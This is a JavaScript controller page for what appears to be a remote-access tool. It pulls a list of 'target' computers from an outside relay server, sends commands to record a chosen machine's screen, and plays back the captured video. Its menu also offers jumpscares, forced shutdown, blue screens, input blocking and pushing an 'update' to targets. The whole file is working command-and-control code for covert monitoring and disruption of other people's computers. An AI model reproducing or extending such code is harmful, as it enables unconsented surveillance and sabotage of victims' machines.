let computerItems = document.querySelectorAll('.computer-list li');
const computerList = document.querySelector('.computer-list');
const displayArea = document.querySelector('.display-area');
const displayText = document.querySelector('.display-text');
const displayBox = document.querySelector('.display-box');
const options = document.querySelector('.options');
const loader = document.querySelector('.loader');
const logs = document.querySelector('.logs');
const menu = document.querySelector('.menu');
const log = document.querySelector('.log');
const duration = 5;

let currentComputer = '';
let currentTime = '';
let retryNum = 0

const terminal = (function() {
    const terminal = function() {
        log.innerHTML += '<p class="init">[INIT] Terminal active.'
        log.scrollTop = log.scrollHeight;
    };

    terminal.log = function(message) {
        log.innerHTML += `<p>[LOG] ${message}</p>`
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    };

    terminal.warn = function(message) {
        log.innerHTML += `<p class="warn">[WARN] ${message}</p>`;
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    };

    terminal.error = function(message) {
        log.innerHTML += `<p class="error">[ERR!] ${message}</p>`;
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    }

    return terminal;
})();

async function refreshPCList() {
    const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ all_computers: 'none' })
    });
    const computers = await res.json();
    computerList.innerHTML += computers.map(c => `<li>${c}</li>`).join('');
    
    computerItems = document.querySelectorAll('.computer-list li');
}

// setTimeout(() => {
    loader.style.animation = 'fade-out 1s ease-in-out';
    setTimeout(() => {
        loader.style.display = 'none';
        menu.style.display = 'flex';
        menu.style.animation = 'fade-in 1s ease-in-out';
    }, 1000);
// }, 2000);

(async () => {
    setTimeout(() => {
        refreshPCList()
        terminal()
    }, 2000)
    
    let optionsMenuOpen = false;

    options.addEventListener('click', (e) => {
        e.stopPropagation();

        options.classList.add('active')

        let menu = options.querySelector('.options-menu');
        if (menu) {
            menu.remove();
            return;
        }

        menu = document.createElement('div');
        menu.className = 'options-menu';
        menu.innerHTML = `
            <button>Clear Logs</button>
            <br>
            <button>Jumpscare</button>
            <br>
            <button>Shutdown PC</button>
            <br>
            <button>BSOD</button>
            <br>
            <button>Flash PC</button>
            <br>
            <button>Block inputs</button>
            <br>
            <button>Release update</button>
        `;
        options.appendChild(menu);
    });

    document.addEventListener('click', () => {
        options.classList.remove('active')
        document.querySelectorAll('.options-menu').forEach(m => m.remove());
    });


    computerItems.forEach(item => {
        item.addEventListener('click', async () => {
            currentComputer = item.textContent;
            const now = new Date();
            const year = now.getFullYear();
            const month = String(now.getMonth()+1).padStart(2,'0');
            const day = String(now.getDate()).padStart(2,'0');
            const hours = String(now.getHours()).padStart(2,'0');
            const minutes = String(now.getMinutes()).padStart(2,'0');
            currentTime = `${year}-${month}-${day}_${hours}-${minutes}`;

            terminal.log(`POSTED: record-${currentComputer}-${currentTime}`)
            await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: `record-${currentComputer}`,
                    time: currentTime,
                    duration: duration
                })
            });

            renderVideo(currentComputer, currentTime);  
        });
    });

    computerItems.forEach(item=>{
        item.addEventListener('click',async()=>{
            document.querySelectorAll('.computer-list li')
                .forEach(li=>li.classList.remove('active'));
            item.classList.add('active');
        });
    });

})();

async function renderVideo(computer, timestamp) {
    const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages');
    const text = await res.text();

    if (!text || text.trim() === '[]') {
        setTimeout(() => renderVideo(computer, timestamp), 1000);
    } else if (!text.includes('screen-recording-ready')) {
        terminal.warn("Wrong fetch, refunding post.")
        await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: text,
        });

        terminal.log("Refunded")
        retryNum += 1
        if (retryNum == 5) {
            terminal.error('Request not fetched, maybe target offline?')
            setTimeout(() => {
                displayText.innerHTML = 'No Display'
            }, 2000)
        } else {
            setTimeout(() => renderVideo(computer, timestamp), 1000);
        }
        return;
    } else if (text.includes('screen-recording-ready')) {
        terminal.log("Video ready, rendering")

        displayBox.outerHTML = `
            <video class='screen-rec' controls autoplay muted>
                <source src="/fetch_recording/${computer}/${timestamp}" type="video/mp4">
            </video>`;
        return;
    }
}
